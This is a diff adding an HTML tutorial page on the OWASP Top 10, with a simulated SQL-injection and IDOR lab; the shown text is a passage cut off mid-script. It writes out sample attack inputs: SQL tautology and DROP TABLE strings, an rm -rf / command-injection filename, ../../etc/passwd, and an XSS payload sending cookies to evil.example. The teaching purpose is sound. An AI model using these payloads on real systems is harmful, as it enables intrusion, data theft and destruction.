@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Backend Security &amp; the OWASP Top 10 — Backend Engineering</title>
+  <link rel="stylesheet" href="../assets/theme.css" />
+  <style>
+    /* Page-local CSS: wiring for the vulnerable-endpoint lab only. */
+    .lab-tabs { display: flex; gap: var(--sp-2); margin-bottom: var(--sp-4); flex-wrap: wrap; }
+    .lab-tab {
+      font: inherit; font-weight: 600; font-size: var(--fs-sm);
+      padding: 0.55em 1.1em; border-radius: var(--radius);
+      border: 1px solid var(--border-strong); background: var(--surface);
+      color: var(--text-muted); cursor: pointer;
+      transition: border-color .15s, background .15s, color .15s;
+    }
+    .lab-tab:hover { border-color: var(--accent); }
+    .lab-tab.active { border-color: var(--accent); background: var(--accent-soft); color: var(--accent-strong); }
+
+    .lab-session {
+      font-family: var(--font-mono); font-size: var(--fs-sm); color: var(--text-muted);
+      background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-sm);
+      padding: var(--sp-2) var(--sp-4); margin-bottom: var(--sp-4);
+    }
+    .lab-session b { color: var(--text); }
+
+    .lab-mode-row { display: flex; align-items: center; gap: var(--sp-3); margin-bottom: var(--sp-4); flex-wrap: wrap; }
+    .lab-mode-label { font-family: var(--font-mono); font-size: var(--fs-eyebrow); letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-faint); }
+    .lab-mode-btn {
+      font: inherit; font-weight: 700; font-size: var(--fs-sm);
+      padding: 0.4em 0.95em; border-radius: 999px; border: 1px solid var(--border-strong);
+      background: var(--surface-2); color: var(--text); cursor: pointer;
+      transition: border-color .15s, background .15s, color .15s;
+    }
+    .lab-mode-btn[aria-pressed="true"][data-mode="vulnerable"] { border-color: var(--danger); background: var(--danger-soft); color: var(--danger); }
+    .lab-mode-btn[aria-pressed="true"][data-mode="fixed"] { border-color: var(--ok); background: var(--ok-soft); color: var(--ok); }
+
+    .lab-code {
+      margin: 0 0 var(--sp-4);
+    }
+    .lab-code pre { margin: 0; font-size: 0.8rem; }
+
+    .lab-input-row { display: flex; flex-wrap: wrap; gap: var(--sp-3); margin-bottom: var(--sp-3); }
+    .lab-input-row input[type="text"], .lab-input-row input[type="number"] { flex: 1 1 220px; }
+    .lab-preset-row { display: flex; flex-wrap: wrap; gap: var(--sp-2); margin-bottom: var(--sp-4); }
+    .lab-preset-btn {
+      font: inherit; font-size: var(--fs-sm);
+      padding: 0.35em 0.8em; border-radius: 999px; border: 1px dashed var(--border-strong);
+      background: transparent; color: var(--text-muted); cursor: pointer;
+      transition: border-color .15s, color .15s;
+    }
+    .lab-preset-btn:hover { border-color: var(--accent); color: var(--accent-strong); }
+
+    .lab-io {
+      display: grid; grid-template-columns: 1fr; gap: var(--sp-3); margin-bottom: var(--sp-3);
+    }
+    .lab-io-block {
+      background: var(--surface-code); color: var(--text-on-code);
+      border: 1px solid var(--border-strong); border-radius: var(--radius);
+      padding: var(--sp-3) var(--sp-4); font-family: var(--font-mono); font-size: 0.78rem;
+      white-space: pre-wrap; word-break: break-word; line-height: 1.6; min-height: 2.2em;
+    }
+    .lab-io-label { font-family: var(--font-mono); font-size: var(--fs-eyebrow); letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-faint); margin-bottom: var(--sp-1); }
+    .lab-inject { color: #ff9e9e; font-weight: 700; }
+
+    .lab-verdict {
+      font-size: var(--fs-sm); font-weight: 700; margin-top: var(--sp-2);
+      padding: var(--sp-3) var(--sp-4); border-radius: var(--radius-sm);
+      display: none;
+    }
+    .lab-verdict.show { display: block; }
+    .lab-verdict.bad { background: var(--danger-soft); color: var(--danger); }
+    .lab-verdict.good { background: var(--ok-soft); color: var(--ok); }
+    .lab-verdict.neutral { background: var(--surface-2); color: var(--text-muted); }
+
+    @media (max-width: 620px) { .lab-mode-row { flex-direction: column; align-items: flex-start; } }
+  </style>
+</head>
+<body>
+  <main class="deepdive">
+    <p class="eyebrow">Security &amp; Quality // 02</p>
+    <h1>Backend Security &amp; the OWASP Top 10</h1>
+
+    <p>
+      <em>Authentication &amp; Authorization Done Right</em> covered getting identity and access
+      decisions right by design — hashing, tokens, OAuth2, RBAC/ABAC. This page covers the rest of
+      the threat model: what happens when a request carries a payload designed to make your code
+      do something it was never meant to do, when a config file leaks something it shouldn't, or
+      when an exception path silently does the unsafe thing. None of this is exotic. Almost every
+      real breach traces back to one of a small, well-known set of mistakes, cataloged for two
+      decades by the <span class="term">OWASP Top 10</span> — and the fixes are neither hard nor
+      mysterious once you've internalized the pattern. What's hard is remembering to apply them
+      <em>everywhere</em>, every time, because the attacker only needs one place you didn't.
+    </p>
+
+    <h2>A threat model, not a checklist</h2>
+    <p>
+      The mindset shift that matters more than any individual fix: stop asking "does this work for
+      a well-behaved client" and start asking "what happens if the caller is actively hostile."
+      Every input — a query string, a JSON body, a header, a filename, an uploaded file's
+      content-type — is untrusted until your code proves otherwise. That includes input that
+      <em>looks</em> internal: a service-to-service call, a message off a queue, a value read back
+      out of your own database that started life as someone else's user input. Security bugs are
+      almost always a missing "what if this isn't what I expect" branch, not a missing feature.
+    </p>
+
+    <h2>The OWASP Top 10, and where each risk lives in this course</h2>
+    <p>
+      OWASP refreshed the Top 10 for its 2025 edition, and the reshuffle is itself a useful signal
+      of where real-world breaches have shifted: <b>Security Misconfiguration</b> jumped from #5 to
+      #2, and two categories are new — <b>Software Supply Chain Failures</b> (dependency and
+      build-pipeline compromise, broader than the old "vulnerable components" entry) and
+      <b>Mishandling of Exceptional Conditions</b> (unsafe behavior on the error path). Several
+      areas of this roadmap already cover — or will cover — specific items in depth; this page is
+      the map plus a deep dive on the two most exploitable ones.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>2025 rank</th><th>Category</th><th>Where it's covered</th></tr></thead>
+        <tbody>
+          <tr><td>A01</td><td>Broken Access Control</td><td><b>This page</b> (deep dive) + <em>Auth &amp; Access</em> (IDOR)</td></tr>
+          <tr><td>A02</td><td>Security Misconfiguration</td><td><b>This page</b></td></tr>
+          <tr><td>A03</td><td>Software Supply Chain Failures <span class="badge accent">new</span></td><td><b>This page</b></td></tr>
+          <tr><td>A04</td><td>Cryptographic Failures</td><td><em>Auth &amp; Access</em> (hashing) + <b>this page</b> (transport, secrets)</td></tr>
+          <tr><td>A05</td><td>Injection</td><td><b>This page</b> (deep dive)</td></tr>
+          <tr><td>A06</td><td>Insecure Design</td><td><em>The System Design Method</em> (capstone)</td></tr>
+          <tr><td>A07</td><td>Authentication Failures</td><td><em>Auth &amp; Access</em></td></tr>
+          <tr><td>A08</td><td>Software or Data Integrity Failures</td><td><b>This page</b> + <em>Deployment &amp; CI/CD</em></td></tr>
+          <tr><td>A09</td><td>Security Logging &amp; Alerting Failures</td><td><em>Observability</em></td></tr>
+          <tr><td>A10</td><td>Mishandling of Exceptional Conditions <span class="badge accent">new</span></td><td><b>This page</b></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout note">
+      <span class="callout-icon">i</span>
+      <span class="callout-title">Note</span>
+      <div class="callout-body">
+        <p>The Top 10 is a list of <em>categories</em>, ranked by prevalence and impact across
+        tested applications — it's not exhaustive and it's not a spec. Treat it the way you'd
+        treat a postmortem index: a curated list of the failure modes worth building habits and
+        tooling around first, not the complete universe of things that can go wrong. A dedicated
+        API-focused variant, the OWASP API Security Top 10, exists too and leads with the same
+        access-control failures — <b>Broken Object Level Authorization</b> and <b>Broken Function
+        Level Authorization</b> — because APIs expose object IDs directly far more often than
+        server-rendered apps do.</p>
+      </div>
+    </div>
+
+    <h2>Injection: never let untrusted input become code</h2>
+    <p>
+      An <span class="term">injection</span> vulnerability happens whenever untrusted input gets
+      concatenated into a command that a downstream interpreter — a SQL engine, a shell, an LDAP
+      query, a NoSQL query language — then parses as <em>syntax</em> instead of treating purely as
+      <em>data</em>. SQL injection is the canonical example because it's the one every backend
+      engineer touches constantly:
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th></th><th>Vulnerable</th><th>Why it breaks</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>Query built by concatenation</td>
+            <td><code>"SELECT * FROM users WHERE name = '" + input + "'"</code></td>
+            <td>If <code>input</code> is <code>' OR '1'='1</code>, the resulting string is a
+              syntactically valid query whose <code>WHERE</code> clause is always true — the
+              database has no way to know the closing quote came from an attacker, not your code.</td>
+          </tr>
+          <tr>
+            <td>Parameterized / prepared statement</td>
+            <td><code>db.query("SELECT * FROM users WHERE name = ?", [input])</code></td>
+            <td>The query's <em>structure</em> is sent to the database and compiled first, with a
+              placeholder for the value; <code>input</code> is bound afterward as a literal, no
+              matter what characters it contains. There's no step where the database re-parses your
+              data as syntax, so there's nothing for the attacker to break out of.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout insight">
+      <span class="callout-icon">★</span>
+      <span class="callout-title">Insight</span>
+      <div class="callout-body">
+        <p>This is the same root cause named in the JWT algorithm-confusion bug from the previous
+        page: letting untrusted input dictate how it gets interpreted. Parameterization doesn't
+        "sanitize" the input at all — it removes the ambiguity entirely, by fixing the query's
+        structure before the untrusted value is ever in play. That's a strictly stronger guarantee
+        than any amount of escaping or filtering, which have to anticipate every dangerous
+        character and context correctly, forever.</p>
+      </div>
+    </div>
+
+    <p>
+      SQL is the most familiar case, but the same shape recurs anywhere untrusted input reaches an
+      interpreter:
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Variant</th><th>Vector</th><th>Fix</th></tr></thead>
+        <tbody>
+          <tr><td>NoSQL injection</td><td>A JSON body field like <code>{"password": {"$ne": null}}</code> passed straight into a MongoDB query operator instead of a literal value</td><td>Validate input shape/type before it reaches the query builder; never merge raw request bodies into query documents</td></tr>
+          <tr><td>OS command injection</td><td><code>exec("convert " + filename + " out.png")</code> with a filename like <code>a.jpg; rm -rf /</code></td><td>Avoid shelling out to build commands from input at all; if unavoidable, use an API that passes arguments as an array (no shell parsing) rather than a single interpolated string</td></tr>
+          <tr><td>LDAP / XPath injection</td><td>Same pattern against a directory or XML query language</td><td>Parameterized query APIs where the library supports them; strict allowlist validation otherwise</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout pitfall">
+      <span class="callout-icon">!</span>
+      <span class="callout-title">Pitfall</span>
+      <div class="callout-body">
+        <p>An ORM does not make injection impossible — it makes the <em>safe path the default
+        path</em>, which is different. <code>User.where(name: input)</code> is parameterized under
+        the hood; <code>User.where("name = '#{input}'")</code> or a <code>.raw()</code> /
+        <code>.exec_query()</code> escape hatch is exactly as vulnerable as hand-written
+        concatenation, and every ORM has one of those escape hatches for the query the abstraction
+        can't express. Code review should treat any raw/string-built query as an automatic flag,
+        ORM or not.</p>
+      </div>
+    </div>
+
+    <h2>Broken access control, beyond the object-level case</h2>
+    <p>
+      The previous page covered <span class="term">broken object-level authorization</span>
+      (IDOR) — a valid, authenticated user reaching a resource that isn't theirs because the
+      endpoint never checked ownership. It remains the single most common access-control bug, and
+      three close relatives round out the category:
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Pattern</th><th>What goes wrong</th></tr></thead>
+        <tbody>
+          <tr><td>Broken function-level authorization</td><td>A regular user calls <code>POST /admin/users/promote</code> directly — the endpoint checks "is there a valid token" but never "does this token's role permit this specific function." (Vertical privilege escalation: a low-privilege user reaches a high-privilege action, vs. IDOR's horizontal case of reaching a peer's data.)</td></tr>
+          <tr><td>Mass assignment</td><td>A request body like <code>{"name": "Ann", "role": "admin"}</code> gets bound directly onto a model with <code>User.update(request.body)</code>. The endpoint only meant to let a user edit their name; because every field in the body is trusted, the attacker granted themselves a role nobody offered them the field to set.</td></tr>
+          <tr><td>Path traversal</td><td>A file-download endpoint builds a path from user input, <code>open("/uploads/" + filename)</code>, and never rejects a filename like <code>../../etc/passwd</code> or an absolute path that escapes the intended directory entirely.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      All three share the same fix shape as IDOR: don't trust the caller's framing of the request
+      (which fields they included, which path they asked for) — explicitly allowlist what's
+      permitted (which fields are bindable, which role can call this handler, which directory a
+      resolved path must stay inside) and reject everything else.
+    </p>
+
+    <h2>Secrets and transport: the boring controls that matter most</h2>
+    <p>
+      Two controls are unglamorous, non-negotiable, and responsible for an outsized share of real
+      incidents when skipped:
+    </p>
+    <ul>
+      <li><b>Secrets never live in code or config committed to version control</b> — not an API
+        key, not a DB password, not a signing secret, not "just for now." Inject them at runtime
+        from environment variables or a secrets manager (Vault, AWS Secrets Manager, GCP Secret
+        Manager), scope each secret's access as narrowly as the service that needs it, and rotate
+        on a schedule rather than only after a suspected leak. A secret committed to git is
+        compromised the moment it's pushed, even if the commit is later reverted — assume it's in
+        every clone, fork, and CI log forever, and rotate it rather than hoping no one noticed.</li>
+      <li><b>Transport security everywhere</b>, not just the public edge. TLS terminates
+        client-to-load-balancer traffic in most designs (see <em>Networking for Backend
+        Engineers</em> for the handshake mechanics), but internal service-to-service calls inside
+        the same VPC are not automatically safe — anyone who compromises one host on that network
+        can otherwise read or tamper with plaintext traffic between your services. Mutual TLS
+        (mTLS) between services, enforced HSTS so a browser never silently downgrades to HTTP, and
+        rejecting mixed content are the baseline, not a hardening extra.</li>
+    </ul>
+
+    <h2>Input validation and output encoding are two different jobs</h2>
+    <p>
+      It's tempting to treat "sanitize user input" as one step that makes data safe everywhere it's
+      later used. It doesn't, because <em>safe</em> is context-dependent: the same string is
+      dangerous in a SQL query, an HTML page, a shell command, and a URL for completely different
+      reasons, and a filter written for one context routinely fails to protect the others.
+    </p>
+    <dl class="definition">
+      <dt>Input validation</dt>
+      <dd>Runs once, at the boundary where data enters your system. Job: reject data that doesn't
+        conform to what the field is supposed to hold — an email field should look like an email, a
+        quantity should be a positive integer within a sane range. Prefer an <b>allowlist</b>
+        ("only these characters/shapes are valid") over a <b>denylist</b> ("block these known-bad
+        patterns") — a denylist has to anticipate every dangerous variant an attacker might try
+        next; an allowlist just has to describe what's legitimately valid, which is usually a much
+        smaller, more stable set.</dd>
+      <dt>Output encoding</dt>
+      <dd>Runs every time data is about to cross into a new interpreter — rendered into HTML,
+        embedded in a <code>&lt;script&gt;</code> block, placed in a URL query string, written into
+        a SQL query (where parameterization is the encoding). It must match the <em>specific
+        sink</em>: HTML-body encoding, HTML-attribute encoding, and JavaScript-string encoding
+        escape different characters, because each context's syntax is different.</dd>
+    </dl>
+
+    <div class="callout pitfall">
+      <span class="callout-icon">!</span>
+      <span class="callout-title">Pitfall</span>
+      <div class="callout-body">
+        <p>A filter that strips <code>&lt;script&gt;</code> tags from a comment field, then renders
+        that comment into <code>&lt;div title="{{comment}}"&gt;</code>, is still exploitable —
+        cross-site scripting (XSS) here doesn't need a script tag at all: <code>" onmouseover="fetch('//evil.example/steal?c='+document.cookie)</code>
+        breaks out of the attribute using nothing the input-time filter was looking for. The filter
+        anticipated the wrong sink. The reliable fix is encoding <em>at the render call</em>, using
+        an encoder matched to exactly where the data is going — most modern templating engines
+        auto-escape for the HTML-body case by default; attribute contexts, inline JS, and raw
+        <code>innerHTML</code> calls are where teams still get burned.</p>
+      </div>
+    </div>
+
+    <h2>Rate limiting and abuse prevention</h2>
+    <p>
+      Not every hostile request is malformed — some are perfectly valid requests sent far too many
+      times. A login endpoint with no rate limit is an open invitation to <span class="term">credential
+      stuffing</span> (replaying breached username/password pairs from other services) and brute
+      force; a public search endpoint with no limit is an open invitation to scrape your entire
+      dataset or run up your database bill. The standard defense is a <span class="term">token
+      bucket</span> or sliding-window counter per identity (API key, account, or IP as a fallback),
+      returning <code>429 Too Many Requests</code> with a <code>Retry-After</code> header once the
+      budget is spent.
+    </p>
+    <div class="callout caution">
+      <span class="callout-icon">!</span>
+      <span class="callout-title">Caution</span>
+      <div class="callout-body">
+        <p>Per-IP limiting alone is weaker than it looks: an attacker with a botnet or a rotating
+        residential-proxy pool spreads requests across thousands of source IPs, each individually
+        under the limit. Layer per-account/per-credential limits (which don't care how many IPs the
+        attempts came from), CAPTCHA or step-up friction after a handful of failures, and — for
+        login specifically — checking new credentials against known-breached-password lists before
+        accepting them. This is a distinct problem from the resilience patterns covered earlier:
+        <em>circuit breakers and backoff protect you from a failing downstream dependency; rate
+        limiting protects you from an abusive upstream caller</em> — the traffic is the threat, not
+        a symptom of something else being broken.</p>
+      </div>
+    </div>
+
+    <h2>Security misconfiguration, supply chain, and the error path — the 2025 additions</h2>
+    <p>
+      Three categories that are easy to under-rate because none of them are a single dramatic bug —
+      each is a class of small, cumulative gaps:
+    </p>
+    <dl class="definition">
+      <dt>Security misconfiguration (A02)</dt>
+      <dd>Default credentials left enabled, verbose stack traces returned to the client in
+        production (a gift-wrapped map of your framework version, file paths, and sometimes query
+        text to an attacker), overly permissive CORS (<code>Access-Control-Allow-Origin: *</code>
+        alongside credentialed requests), unnecessary admin interfaces or debug endpoints reachable
+        from the public internet, and cloud storage buckets left world-readable. None of these are
+        exotic exploits — they're checklist items that drift out of compliance as a system grows,
+        which is exactly why it jumped to #2: it scales with surface area, not with attacker
+        sophistication.</dd>
+      <dt>Software supply chain failures (A03)</dt>
+      <dd>Your service is only as trustworthy as every dependency it pulls in and every step of the
+        pipeline that builds and ships it. A malicious or compromised package (the 2024 XZ Utils
+        backdoor, inserted by a trusted-looking maintainer over years, is the reference case), a
+        typosquatted package name, or a compromised CI runner can inject arbitrary code before your
+        own review ever runs. Mitigations: pin exact dependency versions with a lockfile, generate
+        and review a software bill of materials (SBOM), run automated vulnerability scanning on
+        dependencies in CI, and treat build-pipeline credentials (the ones that can push a release)
+        with the same access rigor as production database credentials.</dd>
+      <dt>Mishandling of exceptional conditions (A10)</dt>
+      <dd>What your code does <em>when something goes wrong</em> is itself a security decision. An
+        authorization check wrapped in a try/catch that defaults to "allow" if the permission
+        lookup throws is a textbook fail-open bug — the exact condition an attacker wants to
+        trigger. An error handler that serializes the raw exception (including a database
+        connection string or an internal hostname) into the HTTP response leaks internals for
+        free. The governing rule: <b>fail closed</b> — on any exceptional condition where you're not
+        certain the action is authorized, deny it and log the failure, rather than defaulting to
+        whichever behavior was easiest to code.</dd>
+    </dl>
+
+    <h2>It all comes back to least privilege</h2>
+    <p>
+      Nearly every fix on this page is a special case of one principle: give every identity —
+      a user, a service account, a database role, a CI pipeline's deploy token — exactly the access
+      it needs to do its job, and nothing more. A database user your app connects with should hold
+      <code>SELECT</code>/<code>INSERT</code>/<code>UPDATE</code> on its own tables, not
+      superuser; a service's cloud IAM role should reach the three resources it actually touches,
+      not <code>*</code>; an API key for a read-only reporting integration should be structurally
+      incapable of writing, even though nothing in today's code path would misuse that power.
+      Least privilege doesn't prevent every bug, but it caps the blast radius of the ones that get
+      through — a leaked read-only key or a compromised low-privilege service account is an
+      incident; a leaked superuser credential is a headline.
+    </p>
+
+    <div class="callout insight">
+      <span class="callout-icon">★</span>
+      <span class="callout-title">ML-systems bridge</span>
+      <div class="callout-body">
+        <p>Every category above has a direct LLM/ML-systems analogue. <b>Prompt injection</b> — user
+        or retrieved content containing instructions that override the system prompt — is
+        structurally the same failure as SQL injection: untrusted content is being interpreted as
+        instructions instead of data, because there's no hard boundary between the two in a raw
+        text context; treating retrieved documents, tool outputs, and user messages as data to be
+        reasoned <em>about</em> rather than commands to obey is the mitigation, imperfect as current
+        techniques are. <b>Model and dataset supply chain</b> is A03 wearing an ML costume: a
+        downloaded model checkpoint or training dataset from an unverified source is exactly as
+        risky as an unpinned dependency — verify checksums, prefer signed artifacts, and know the
+        provenance of anything you fine-tune on or serve. And a feature store that returns every
+        computed feature to whichever service asks, rather than the subset that service's tenant
+        and privacy tier are entitled to, is broken object-level authorization on feature data
+        instead of order data — same bug, same fix: check what this caller may see, every time.</p>
+      </div>
+    </div>
+
+    <p>
+      The lab below simulates two of the bugs from this page against a toy API — flip between
+      vulnerable and fixed implementations and watch the same request produce a very different
+      outcome.
+    </p>
+
+    <div class="widget">
+      <div class="widget-label">Interactive — vulnerable-endpoint lab</div>
+      <div class="lab-tabs" role="tablist">
+        <button class="lab-tab active" type="button" data-lab="sqli" role="tab" aria-selected="true">SQL injection</button>
+        <button class="lab-tab" type="button" data-lab="idor" role="tab" aria-selected="false">Broken access control (IDOR)</button>
+      </div>
+
+      <div class="lab-pane" data-lab="sqli">
+        <p class="mono muted" style="margin-top:0">Endpoint: <code>GET /api/users?search=</code> — searches usernames.</p>
+        <div class="lab-mode-row">
+          <span class="lab-mode-label">Implementation:</span>
+          <button class="lab-mode-btn" type="button" data-mode="vulnerable" aria-pressed="true">Vulnerable (concatenated)</button>
+          <button class="lab-mode-btn" type="button" data-mode="fixed" aria-pressed="false">Fixed (parameterized)</button>
+        </div>
+        <div class="lab-code">
+          <pre><code id="sqliCode"></code></pre>
+        </div>
+        <div class="lab-preset-row">
+          <button class="lab-preset-btn" type="button" data-preset="ali">Normal search: "ali"</button>
+          <button class="lab-preset-btn" type="button" data-preset="%' OR '1'='1">Injection: "%' OR '1'='1"</button>
+          <button class="lab-preset-btn" type="button" data-preset="%'; DROP TABLE users; --">Injection: "%'; DROP TABLE users; --"</button>
+        </div>
+        <div class="lab-input-row">
+          <input type="text" id="sqliInput" value="ali" aria-label="search parameter" />
+          <button class="btn" type="button" id="sqliRun">Send request</button>
+        </div>
+        <div class="lab-io">
+          <div>
+            <div class="lab-io-label">Query sent to the database</div>
+            <div class="lab-io-block" id="sqliQuery"></div>
+          </div>
+          <div>
+            <div class="lab-io-label">Response body</div>
+            <div class="lab-io-block" id="sqliResult"></div>
+          </div>
+        </div>
+        <div class="lab-verdict" id="sqliVerdict"></div>
+      </div>
+
+      <div class="lab-pane" data-lab="idor" hidden>
+        <div class="lab-session">Logged in as: <b>alice</b> (user_id 101) — this session's token is valid and unexpired.</div>
+        <p class="mono muted" style="margin-top:0">Endpoint: <code>GET /api/orders/:id</code> — fetches one order by ID.</p>
+        <div class="lab-mode-row">
+          <span class="lab-mode-label">Implementation:</span>
+          <button class="lab-mode-btn" type="button" data-mode="vulnerable" aria-pressed="true">Vulnerable (no ownership check)</button>
+          <button class="lab-mode-btn" type="button" data-mode="fixed" aria-pressed="false">Fixed (ownership checked)</button>
+        </div>
+        <div class="lab-code">
+          <pre><code id="idorCode"></code></pre>
+        </div>
+        <div class="lab-preset-row">
+          <button class="lab-preset-btn" type="button" data-preset="201">Your order (id 201)</button>
+          <button class="lab-preset-btn" type="button" data-preset="202">Bob's order (id 202)</button>
+        </div>
+        <div class="lab-input-row">
+          <input type="number" id="idorInput" value="201" aria-label="order id" />
+          <button class="btn" type="button" id="idorRun">Send request</button>
+        </div>
+        <div class="lab-io">
+          <div>
+            <div class="lab-io-label">HTTP response</div>
+            <div class="lab-io-block" id="idorResult"></div>
+          </div>
+        </div>
+        <div class="lab-verdict" id="idorVerdict"></div>
+      </div>
+    </div>
+
+    <div class="quiz" id="quiz">
+      <div class="quiz-block" data-answer="b">
+        <p class="quiz-q">1. Why does a parameterized query stop SQL injection, when escaping
+          quotes by hand often doesn't?</p>
+        <div class="quiz-options">
+          <button class="quiz-option" data-choice="a">It's just a more thorough form of input validation — it checks the input against a longer list of dangerous characters.</button>
+          <button class="quiz-option" data-choice="b">It separates the query's structure from the data: the query is compiled first, and the input is bound afterward as a literal value that can never be reinterpreted as SQL syntax.</button>
+          <button class="quiz-option" data-choice="c">It works by automatically stripping quote characters from whatever the user submits.</button>
+        </div>
+        <p class="quiz-explain" hidden>Escaping has to correctly anticipate every dangerous character for every possible context, forever. Parameterization sidesteps the whole problem — there's no step where your data gets re-parsed as commands, because the command was already fixed before the data arrived.</p>
+      </div>
+
+      <div class="quiz-block" data-answer="a">
+        <p class="quiz-q">2. An app strips <code>&lt;script&gt;</code> tags from user comments on
+          input, then later renders a comment into <code>&lt;div title="{{comment}}"&gt;</code>.
+          Why can this still be exploitable?</p>
+        <div class="quiz-options">
+          <button class="quiz-option" data-choice="a">Input-time filtering can't anticipate every output context; an attribute-breakout payload doesn't need a script tag at all. Encoding has to happen at the specific sink the data is rendered into.</button>
+          <button class="quiz-option" data-choice="b">It can't — stripping script tags is sufficient defense against XSS in any context.</button>
+          <button class="quiz-option" data-choice="c">Because the filter should have blocked all HTML entirely, including harmless punctuation.</button>
+        </div>
+        <p class="quiz-explain" hidden>"Sanitize on input" and "encode on output" are different jobs. A filter tuned for the HTML-body case doesn't protect an HTML-attribute sink, which has a different breakout syntax (closing the attribute's quote, not opening a tag). Encode at the render call, matched to that exact sink.</p>
+      </div>
+
+      <div class="quiz-block" data-answer="b">
+        <p class="quiz-q">3. A login endpoint has no rate limiting. What's it most exposed to, and
+          why doesn't a simple per-IP limit fully solve it?</p>
+        <div class="quiz-options">
+          <button class="quiz-option" data-choice="a">SQL injection — rate limiting is the standard defense against injection attacks.</button>
+          <button class="quiz-option" data-choice="b">Credential stuffing and brute force — an attacker with a botnet or rotating proxies spreads attempts across many IPs, each individually under any per-IP threshold. Per-account limits and breached-password checks are needed alongside it.</button>
+          <button class="quiz-option" data-choice="c">Nothing in particular — rate limiting is only relevant to protecting against your own downstream dependencies, per the resilience-patterns page.</button>
+        </div>
+        <p class="quiz-explain" hidden>Rate limiting defends against an abusive caller, not a failing dependency — that's the resilience-pattern circuit breaker's job. A determined credential-stuffing attacker distributes requests across enough source IPs that per-IP limiting alone barely slows them down; per-account/per-credential limits and known-breached-password checks close the gap.</p>
+      </div>
+    </div>
+
+    <h2>What's next</h2>
+    <p>
+      Getting the design right (this page and the last) is half the story — the other half is
+      having tests and process that keep it right as the codebase changes under a team of people who
+      weren't in the room for these decisions. The next deep-dive, <em>Testing Backend
+      Systems</em>, covers the testing pyramid, test doubles, and the CI gates that catch a
+      regression — security or otherwise — before it reaches production.
+    </p>
+  </main>
+
+  <script>
+    (function () {
+      "use strict";
+
+      /* ---------------- Tab switching ---------------- */
+      var tabs = document.querySelectorAll(".lab-tab");
+      var panes = document.querySelectorAll(".lab-pane");
+      tabs.forEach(function (tab) {
+        tab.addEventListener("click", function () {
+          tabs.forEach(function (t) { t.classList.remove("active"); t.setAttribute("aria-selected", "false"); });
+          tab.classList.add("active");
+          tab.setAttribute("aria-selected", "true");
+          var target = tab.dataset.lab;
+          panes.forEach(function (p) { p.hidden = p.dataset.lab !== target; });
+        });
+      });
+
+      function escapeHtml(s) {
+        return String(s).replace(/[&<>"']/g, function (c) {
+          return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
+        });
+      }
+
+      /* ---------------- SQL injection lab ---------------- */
+
+      var USERS = [
+        { id: 1, username: "alice", role: "user" },
+        { id: 2, username: "bob", role: "user" },
+        { id: 3, username: "aliyah", role: "user" },
+        { id: 99, username: "admin_root", role: "admin" }
+      ];
+
+      var CODE_SQLI = {
+        vulnerable:
+          'app.get("/api/users", (req, res) => {\n' +
+          '  const q = `SELECT id, username, role FROM users\n' +
+          '             WHERE username LIKE \'${req.query.search}\'`;\n' +
+          "  res.json(db.execRaw(q));\n" +
+          "});",
+        fixed:
+          'app.get("/api/users", (req, res) => {\n' +
+          '  const rows = db.query(\n' +
+          '    "SELECT id, username, role FROM users WHERE username LIKE ?",\n' +
+          "    [`%${req.query.search}%`]\n" +
+          "  );\n" +
+          "  res.json(rows);\n" +
+          "});"
+      };
+
+      var sqliMode = "vulnerable";
+      var sqliCode = document.getElementById("sqliCode");
+      var sqliInput = document.getElementById("sqliInput");
+      var sqliQuery = document.getElementById("sqliQuery");
+      var sqliResult = document.getElementById("sqliResult");
+      var sqliVerdict = document.getElementById("sqliVerdict");
+
+      function isTautology(raw) {
+        return /'\s*or\s*'?1'?\s*=\s*'?1/i.test(raw) || /or\s+1\s*=\s*1/i.test(raw);
+      }
+      function isDrop(raw) {
+        return /drop\s+table/i.test(raw);
+      }
+
+      function runSqli() {
+        var raw = sqliInput.value;
+        if (sqliMode === "vulnerable") {
+          var built = "SELECT id, username, role FROM users WHERE username LIKE '%" + raw + "%'";
+          var highlighted = "SELECT id, username, role FROM users WHERE username LIKE '%" +
+            '<span class="lab-inject">' + escapeHtml(raw) + "</span>" + "%'";
+          sqliQuery.innerHTML = highlighted;
+
+          if (isDrop(raw)) {
+            sqliResult.textContent = 'Error 500: relation "users" does not exist';
+            sqliVerdict.className = "lab-verdict bad show";
+            sqliVerdict.textContent = "Exploited — the attacker's input closed the string literal and appended a second statement. The table is gone.";
+          } else if (isTautology(raw)) {
+            sqliResult.textContent = JSON.stringify(USERS, null, 2);
+            sqliVerdict.className = "lab-verdict bad show";
+            sqliVerdict.textContent = "Exploited — the injected `OR '1'='1` makes the WHERE clause always true. Every row dumped, including the admin account, with a search that matched nothing legitimately.";
+          } else {
+            var matches = USERS.filter(function (u) { return u.username.toLowerCase().indexOf(raw.toLowerCase()) !== -1; });
+            sqliResult.textContent = JSON.stringify(matches, null, 2);
+            sqliVerdict.className = "lab-verdict neutral show";
+            sqliVerdict.textContent = matches.length ? "Behaves normally for this input — try one of the injection presets." : "No matches.";
+          }
+        } else {
+          sqliQuery.innerHTML =
+            "SELECT id, username, role FROM users WHERE username LIKE ?\n" +
+            'params: ["%' + escapeHtml(raw) + '%"]  (bound as one literal value)';
+          var matches2 = USERS.filter(function (u) { return u.username.toLowerCase().indexOf(raw.toLowerCase()) !== -1; });
+          sqliResult.textContent = JSON.stringify(matches2, null, 2);
+          if (isTautology(raw) || isDrop(raw)) {
+            sqliVerdict.className = "lab-verdict good show";
+            sqliVerdict.textContent = "Blocked — the whole string, quotes and all, is bound as a single literal search value. No username contains that literal text, so it just matches nothing. There's no query for it to break out of.";
+          } else {
+            sqliVerdict.className = "lab-verdict neutral show";
